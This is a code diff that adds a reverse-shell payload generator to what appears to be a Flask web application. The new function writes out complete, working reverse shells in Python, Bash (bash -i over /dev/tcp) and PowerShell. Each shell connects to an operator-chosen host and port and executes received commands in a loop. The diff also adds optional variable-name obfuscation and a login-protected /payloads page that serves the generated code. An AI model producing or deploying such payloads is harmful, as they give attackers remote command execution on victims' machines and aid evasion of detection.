@@ -46,6 +46,134 @@ def get_db():
     conn.row_factory = sqlite3.Row
     return conn
 
+# Payload generation helper
+def generate_simple_payload(host, port, platform, persistence, obfuscate):
+    """Generate a simple reverse shell payload"""
+    import random
+    import string
+    
+    if platform == 'python':
+        payload = f'''#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+import sys
+import time
+
+HOST = "{host}"
+PORT = {port}
+
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((HOST, PORT))
+            return s
+        except:
+            time.sleep(5)
+
+def execute_command(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        return result.stdout + result.stderr
+    except Exception as e:
+        return f"Error: {{str(e)}}"
+
+def main():
+    s = connect()
+    s.send(b"[+] Connected\\n")
+    
+    while True:
+        try:
+            data = s.recv(4096)
+            if not data:
+                break
+            
+            cmd = data.decode('utf-8').strip()
+            
+            if cmd.lower() == 'exit':
+                break
+            
+            output = execute_command(cmd)
+            s.send(output.encode('utf-8'))
+            
+        except Exception as e:
+            try:
+                s.send(f"Error: {{str(e)}}\\n".encode('utf-8'))
+            except:
+                break
+    
+    s.close()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        sys.exit(0)
+'''
+    
+    elif platform == 'bash':
+        payload = f'''#!/bin/bash
+HOST="{host}"
+PORT={port}
+
+while true; do
+    bash -i >& /dev/tcp/$HOST/$PORT 0>&1
+    sleep 5
+done
+'''
+    
+    elif platform == 'powershell':
+        payload = f'''$host = "{host}"
+$port = {port}
+
+while ($true) {{
+    try {{
+        $client = New-Object System.Net.Sockets.TCPClient($host, $port)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+        
+        $writer.WriteLine("[+] Connected")
+        
+        while ($client.Connected) {{
+            $cmd = $reader.ReadLine()
+            if ($cmd -eq "exit") {{ break }}
+            
+            try {{
+                $output = Invoke-Expression $cmd 2>&1 | Out-String
+                $writer.WriteLine($output)
+            }} catch {{
+                $writer.WriteLine("Error: $_")
+            }}
+        }}
+        
+        $client.Close()
+    }} catch {{
+        Start-Sleep -Seconds 5
+    }}
+}}
+'''
+    
+    else:
+        payload = "# Unsupported platform"
+    
+    # Simple obfuscation if requested
+    if obfuscate and platform == 'python':
+        # Variable name randomization
+        var_map = {
+            'HOST': ''.join(random.choices(string.ascii_letters, k=8)),
+            'PORT': ''.join(random.choices(string.ascii_letters, k=8)),
+            'connect': ''.join(random.choices(string.ascii_letters, k=8)),
+            'execute_command': ''.join(random.choices(string.ascii_letters, k=8)),
+            'main': ''.join(random.choices(string.ascii_letters, k=8))
+        }
+        for old, new in var_map.items():
+            payload = payload.replace(old, new)
+    
+    return payload
+
 # Routes
 @app.route('/')
 def index():
@@ -127,6 +255,43 @@ def dashboard():
     }
     
     return render_template('dashboard.html', email=email, stats=stats)
+
+@app.route('/payloads', methods=['GET', 'POST'])
+def payloads():
+    """Payload generator page"""
+    if not session.get('authenticated'):
+        return redirect(url_for('login'))
+    
+    if request.method == 'POST':
+        # Get form data
+        platform = request.form.get('platform', 'python')
+        host = request.form.get('host', 'localhost')
+        port = request.form.get('port', '4444')
+        persistence = request.form.get('persistence') == 'on'
+        obfuscate = request.form.get('obfuscate') == 'on'
+        
+        # Validate inputs
+        try:
+            port = int(port)
+            if port < 1 or port > 65535:
+                flash('Port must be between 1 and 65535', 'error')
+                return render_template('payloads.html')
+        except ValueError:
+            flash('Invalid port number', 'error')
+            return render_template('payloads.html')
+        
+        # Generate payload
+        payload_code = generate_simple_payload(host, port, platform, persistence, obfuscate)
+        
+        return render_template('payloads.html', 
+                             payload=payload_code,
+                             platform=platform,
+                             host=host,
+                             port=port,
+                             persistence=persistence,
+                             obfuscate=obfuscate)
+    
+    return render_template('payloads.html')
 
 @app.route('/logout')
 def logout():
